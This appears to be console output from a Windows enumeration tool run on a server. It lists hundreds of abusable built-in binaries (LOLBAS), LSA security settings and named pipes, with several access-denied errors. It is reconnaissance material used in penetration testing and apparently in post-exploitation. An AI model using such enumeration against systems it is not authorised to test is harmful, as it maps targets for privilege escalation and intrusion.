Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1_none_d31fe5c73774c0db\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\f\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_257a487a7ccb5dd4\r\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\f\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.17763.1697_none_2fcef2ccb12c1fcf\r\rundll32.exe
Path: C:\Windows\System32\runonce.exe
Path: C:\Windows\SysWOW64\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_0680be8217315dfc\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1_none_10d568d44b921ff7\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\f\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_632fcb8790e8bcf0\r\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\f\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.17763.1697_none_6d8475d9c5497eeb\r\runonce.exe
Path: C:\Windows\System32\sc.exe
Path: C:\Windows\SysWOW64\sc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_653424fe2cd61e8c\sc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.17763.1_none_6f88cf506136e087\sc.exe
Path: C:\Windows\System32\schtasks.exe
Path: C:\Windows\SysWOW64\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_7b0561790d7fc67c\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1_none_855a0bcb41e08877\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\f\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_d79b3f66874a77d1\r\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\f\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.17763.1852_none_e1efe9b8bbab39cc\r\schtasks.exe
Path: C:\Windows\System32\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\ScriptRunner.exe
Path: C:\Windows\System32\setupapi.dll
Path: C:\Windows\SysWOW64\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.1_none_25bb43961e674651\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.1_none_300fede852c8084c\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_824f561798338652\r\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\f\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.17763.5830_none_8ca40069cc94484d\r\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\f\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\r\setupapi.dll
Path: C:\Windows\System32\shdocvw.dll
Path: C:\Windows\SysWOW64\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_d83ad76a640f99cc\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.1_none_e28f81bc98705bc7\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\f\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_34d8b7a7ddd4a75e\r\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\f\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.17763.4720_none_3f2d61fa12356959\r\shdocvw.dll
Path: C:\Windows\System32\shell32.dll
Path: C:\Windows\SysWOW64\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_b9c9dcdee3bbba89\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.17763.6292_none_c41e8731181c7c84\r\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\f\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.17763.6292_none_efe5a0203e79a3b1\r\shell32.dll
Path: C:\Windows\System32\slmgr.vbs
Path: C:\Windows\SysWOW64\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.1_none_365f30041749ca42\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.1_none_40b3da564baa8c3d\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_92f3428591160a43\r\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.17763.5830_none_9d47ecd7c576cc3e\r\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wid_31bf3856ad364e35_10.0.17763.1_none_9870f12fb40ec83a\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\130\Shared\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\140\Shared\SqlDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\140\Shared\SqlDumper.exe
Path: C:\Program Files\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft Analysis Services\AS OLEDB\130\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\SQLPS.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\SyncAppvPublishingServer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\f\syncappvpublishingserver.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\r\syncappvpublishingserver.vbs
Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.1_none_bd38610020506813\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17763.6054_none_1a249a3b99da5ee5\SyncAppvPublishingServer.vbs
Path: C:\Windows\System32\syssetup.dll
Path: C:\Windows\SysWOW64\syssetup.dll
PPath: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.17763.1_none_6beb20052440f951\syssetup.dll
Path: C:\Windows\System32\tttracer.exe
Path: C:\Windows\SysWOW64\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.1_none_5529f3f1661c1b19\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.1_none_5f7e9e439a7cdd14\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\f\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_b1b7653edfece4f2\r\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\f\tttracer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.17763.2989_none_bc0c0f91144da6ed\r\tttracer.exe
Path: C:\Windows\System32\url.dll
Path: C:\Windows\SysWOW64\url.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_14e2360420cdaa63\url.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.17763.1_none_b8c39a806870392d\url.dll
Path: C:\Windows\WinSxS\amd64_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.17763.17801_none_b58a806f7ca249b0\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.17763.17801_none_204d503865f7ef36\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_950557bc0844e513\vbc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.1000_none_a662d1c8d33fa842\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.17763.17801_none_fd37b746911e72b6\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.17763.17801_none_c42eb4b4ad9a7e00\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_dcb28e931cc10e19\vbc.exe
Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15713.1000_none_ee10089fe7bbd148\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
Path: C:\Windows\System32\verclsid.exe
Path: C:\Windows\SysWOW64\verclsid.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_acacbb1b6b9db81c\verclsid.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.17763.1_none_b701656d9ffe7a17\verclsid.exe
Path: C:\Program Files\Windows Mail\wab.exe
Path: C:\Program Files (x86)\Windows Mail\wab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_336f47662fbc0a5e\wab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.17763.1_none_3dc3f1b8641ccc59\wab.exe
Path: C:\Windows\System32\winrm.vbs
Path: C:\Windows\SysWOW64\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.1_none_bb2b5f4505313851\winrm.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.1_none_c58009973991fa4c\winrm.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_17bf71c67efd7852\r\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\f\winrm.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.6293.1.12\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.17763.5830_none_22141c18b35e3a4d\r\winrm.vbs
Path: C:\Windows\System32\wbem\WMIC.exe
Path: C:\Windows\SysWOW64\wbem\WMIC.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_926fbf4425005e17\WMIC.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.17763.1_none_9cc4699659612012\WMIC.exe
Path: C:\Windows\System32\wscript.exe
Path: C:\Windows\SysWOW64\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_392e3cfb58835d77\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.1_none_4382e74d8ce41f72\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\f\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_961a7636d20d5449\r\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\f\wscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.6054_none_a06f2089066e1644\r\wscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.1_none_73b46e4327098ae1\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\f\wsl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.2989_none_d041df90a0da54ba\r\wsl.exe
Path: C:\Windows\System32\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1_none_b73de3dd5e2b7bac\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\f\WSReset.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.17763.1697_none_13ecf0e2d7e2daa0\r\WSReset.exe
Path: C:\Windows\System32\xwizard.exe
Path: C:\Windows\SysWOW64\xwizard.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_49b9fab890ad567c\xwizard.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.17763.1_none_540ea50ac50e1877\xwizard.exe
Path: C:\Windows\System32\zipfldr.dll
Path: C:\Windows\SysWOW64\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\f\zipfldr.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_c5591ad907431d42\r\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\f\zipfldr.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.17763.4974_none_cfadc52b3ba3df3d\r\zipfldr.dll
Found: 719 LOLBAS

To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  LsaPid                         : 736
  ProductType                    : 7
  restrictanonymous              : 0
  restrictanonymoussam           : 1
  SecureBoot                     : 1
  LsaCfgFlagsDefault             : 0
====== MappedDrives ======

ERROR:   [!] Terminating exception running command 'MappedDrives': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.MappedDrivesCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== McAfeeConfigs ======

====== McAfeeSiteList ======

ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MicrosoftUpdates ======

Enumerating *all* Microsoft updates

ERROR:   [!] Terminating exception running command 'MicrosoftUpdates': System.UnauthorizedAccessException: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).
   at System.RuntimeTypeHandle.CreateInstance(RuntimeType type, Boolean publicOnly, Boolean noCheck, Boolean& canBeCached, RuntimeMethodHandleInternal& ctor, Boolean& bNeedSecurityCheck)
   at System.RuntimeType.CreateInstanceSlow(Boolean publicOnly, Boolean skipCheckThis, Boolean fillCache, StackCrawlMark& stackMark)
   at System.Activator.CreateInstance(Type type, Boolean nonPublic)
   at System.Activator.CreateInstance(Type type)
   at AnschnallGurt.Commands.Windows.MicrosoftUpdateCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MTPuTTY ======

====== NamedPipes ======


atsvc
    Server Process Id   : 1832
    Server Session Id   : 0

browser
    Server Process Id   : 3984
    Server Session Id   : 0

Ctx_WinStation_API_service
    Server Process Id   : 796
    Server Session Id   : 0

epmapper
    Server Process Id   : 1008
    Server Session Id   : 0

eventlog
    Server Process Id   : 1320
    Server Session Id   : 0

IISFCGI-a79aebfc-163d-480b-a651-85339b1a33b1

iisipmc3e222dd-ac23-4916-b13c-37c838c70a66

iislogpiped964c7c9-55b1-4553-a940-27ad05eb7ad3

InitShutdown
    Server Process Id   : 576
    Server Session Id   : 0

lsass
    Server Process Id   : 736
    Server Session Id   : 0

LSM_API_service
    Server Process Id   : 84
    Server Session Id   : 0

MsFteWds
    Server Process Id   : 7588
    Server Session Id   : 0

ntsvcs
    Server Process Id   : 716
    Server Session Id   : 0

PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER

ProtectedPrefix\LocalService\FTHPIPE

PSHost.134188384768674278.7264.DefaultAppDomain.powershell
    Server Process Id   : 7264
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188385564671025.5288.DefaultAppDomain.powershell
    Server Process Id   : 5288
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188386090770098.5008.DefaultAppDomain.powershell
    Server Process Id   : 5008
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188448174038231.2492.DefaultAppDomain.ascension
    Server Process Id   : 2492
    Server Session Id   : 0
    Server Process Name : ascension
    Server Process Path : C:\Users\svc_dev\Desktop\ascension.exe

PSHost.134188449068554335.5416.DefaultAppDomain.powershell
    Server Process Id   : 5416
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ROUTER
    Server Process Id   : 4864
    Server Session Id   : 0

scerpc
    Server Process Id   : 716
    Server Session Id   : 0

SearchTextHarvester

SessEnvPublicRpc
    Server Process Id   : 3316
    Server Session Id   : 0

sql\query
    Server Process Id   : 4328
    Server Session Id   : 0

SQLLocal\MSSQLSERVER
    Server Process Id   : 4328
    Server Session Id   : 0

srvsvc
    Server Process Id   : 3348
    Server Session Id   : 0

tapsrv
    Server Process Id   : 2576
    Server Session Id   : 0

TermSrv_API_service
    Server Process Id   : 796
    Server Session Id   : 0

trkwks
    Server Process Id   : 2676
    Server Session Id   : 0

vgauth-service
    Server Process Id   : 2632
    Server Session Id   : 0

W32TIME_ALT
    Server Process Id   : 1136
    Server Session Id   : 0

Winsock2\CatalogChangeListener-240-0

Winsock2\CatalogChangeListener-2cc-0

Winsock2\CatalogChangeListener-2e0-0

Winsock2\CatalogChangeListener-3f0-0

Winsock2\CatalogChangeListener-528-0

Winsock2\CatalogChangeListener-728-0

Winsock2\CatalogChangeListener-a10-0

Winsock2\CatalogChangeListener-cf4-0

wkssvc
    Server Process Id   : 2164
    Server Session Id   : 0
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

ERROR:   [!] Terminating exception running command 'NetworkShares': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
